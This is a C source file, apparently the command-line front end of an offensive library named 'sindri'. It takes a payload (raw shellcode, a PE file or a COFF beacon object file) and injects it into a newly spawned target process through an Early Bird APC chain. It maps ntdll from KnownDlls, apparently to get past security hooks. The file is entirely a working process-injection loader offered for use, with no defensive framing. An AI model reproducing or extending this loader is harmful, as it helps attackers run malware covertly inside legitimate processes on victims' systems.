#include <sindri.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void print_usage(const char *program_name, FILE *stream) {
    fprintf(stream,
            "Usage:\n"
            "  %s <mode> -f <payload_path> -t <target_image_path> [options]\n\n"
            "Modes:\n"
            "  shell       Inject raw shellcode\n"
            "  pe          Inject PE (DLL or EXE)\n"
            "  coff        Inject COFF (.obj)\n\n"
            "Options:\n"
            "  -f <path>   Path to the payload.\n"
            "  -t <path>   Path to the executable to spawn as the target.\n"
            "  -e <name>   [COFF] Name of the entry point function to execute (default: 'go').\n"
            "  -a <args>   [COFF] Arguments string to pass to the BOF.\n\n"
            "Notes:\n"
            "  - The loader maps and fixes the image locally in this process.\n"
            "  - The injection handles remote process allocation, marshaling, and execution via Early Bird APC.\n",
            program_name);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0], stderr);
        return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
    }

    const char *mode = argv[1];
    if (strcmp(mode, "-h") == 0 || strcmp(mode, "--help") == 0) {
        print_usage(argv[0], stdout);
        return SND_SUCCESS;
    }

    const char    *file_path         = NULL;
    const wchar_t *target_image_path = NULL;
    wchar_t        wide_target_path[MAX_PATH];
    const char    *entry_name        = "go";
    char          *bof_args          = NULL;
    int            bof_arg_len       = 0;

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-f") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "[-] Missing value for -f.\n");
                print_usage(argv[0], stderr);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            file_path = argv[++i];
            continue;
        }
        if (strcmp(argv[i], "-t") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "[-] Missing value for -t.\n");
                print_usage(argv[0], stderr);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            size_t converted = 0;
            mbstowcs_s(&converted, wide_target_path, MAX_PATH, argv[++i], _TRUNCATE);
            target_image_path = wide_target_path;
            continue;
        }
        if (strcmp(argv[i], "-e") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "[-] Missing value for -e.\n");
                print_usage(argv[0], stderr);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            entry_name = argv[++i];
            continue;
        }
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "[-] Missing value for -a.\n");
                print_usage(argv[0], stderr);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            bof_args    = argv[++i];
            bof_arg_len = (int)strlen(bof_args) + 1;
            continue;
        }
        fprintf(stderr, "[-] Unknown argument: %s\n", argv[i]);
        print_usage(argv[0], stderr);
        return SND_STATUS_INVALID_COMMAND_LINE_ARG;
    }

    if (file_path == NULL || target_image_path == NULL) {
        fprintf(stderr, "[-] Both -f <payload_path> and -t <target_image_path> are required.\n");
        print_usage(argv[0], stderr);
        return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
    }

    snd_status_t status;
    snd_buffer_t file_buf = {0};

    printf("[*] Loading payload into memory: %s\n", file_path);
    status = snd_disk_buffer_load(file_path, &file_buf);
    if (SND_FAILED(status)) {
        goto cleanup_global;
    }

    PVOID ntdll;
    status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
    if (SND_FAILED(status)) {
        goto cleanup_global;
    }

    if (strcmp(mode, "shell") == 0) {
        snd_inj_ctx_t inj_ctx = {0};

        inj_ctx.target_image_path = target_image_path;
        inj_ctx.payload    = &file_buf;
        inj_ctx.proc_api   = &snd_proc_nt;
        inj_ctx.thread_api = &snd_thread_nt;

        printf("[*] Firing high-level shellcode injection chain (Early Bird APC)...\n");
        status = snd_inj_apc_shell(&inj_ctx);

        if (SND_SUCCEEDED(status)) {
            printf("[+] High-level APC chain completed successfully!\n");
        }
        snd_inj_cleanup(&inj_ctx);
    } else if (strcmp(mode, "pe") == 0) {
        snd_ldr_pe_ctx_t ldr_ctx = {0};
        snd_inj_ctx_t    inj_ctx = {0};

        ldr_ctx.mem_api    = &snd_mem_nt;
        ldr_ctx.mod_api    = &snd_mod_nt;
        ldr_ctx.raw_source = &file_buf;

        inj_ctx.target_image_path = target_image_path;
        inj_ctx.proc_api   = &snd_proc_nt;
        inj_ctx.thread_api = &snd_thread_nt;

        printf("[*] Firing high-level PE injection chain (Early Bird APC)...\n");
        status = snd_inj_apc_pe(&ldr_ctx, &inj_ctx);

        if (SND_SUCCEEDED(status)) {
            printf("[+] High-level APC chain completed successfully!\n");
        }
        snd_inj_cleanup(&inj_ctx);
        snd_ldr_pe_free_mapped_image(&ldr_ctx);
    } else if (strcmp(mode, "coff") == 0) {
        snd_ldr_coff_ctx_t ldr_ctx = {0};
        snd_inj_ctx_t      inj_ctx = {0};

        ldr_ctx.mem_api    = &snd_mem_nt;
        ldr_ctx.mod_api    = &snd_mod_nt;
        ldr_ctx.raw_source = &file_buf;

        inj_ctx.target_image_path = target_image_path;
        inj_ctx.proc_api   = &snd_proc_nt;
        inj_ctx.thread_api = &snd_thread_nt;

        printf("[*] Firing high-level COFF injection chain (Early Bird APC)...\n");
        status = snd_inj_apc_coff(&ldr_ctx, &inj_ctx, entry_name, bof_args, bof_arg_len);

        if (SND_SUCCEEDED(status)) {
            printf("[+] High-level APC chain completed successfully!\n");
        }
        snd_inj_cleanup(&inj_ctx);
        snd_ldr_coff_free_mapped_image(&ldr_ctx);
    } else {
        fprintf(stderr, "[-] Unknown mode: %s. Use shell, pe, or coff.\n", mode);
        status = SND_ERR(SND_STATUS_INVALID_COMMAND_LINE_ARG);
    }

cleanup_global:
    snd_buffer_free(&file_buf);

    if (SND_FAILED(status)) {
        snd_status_print(status);
    }

    return status.code;
}
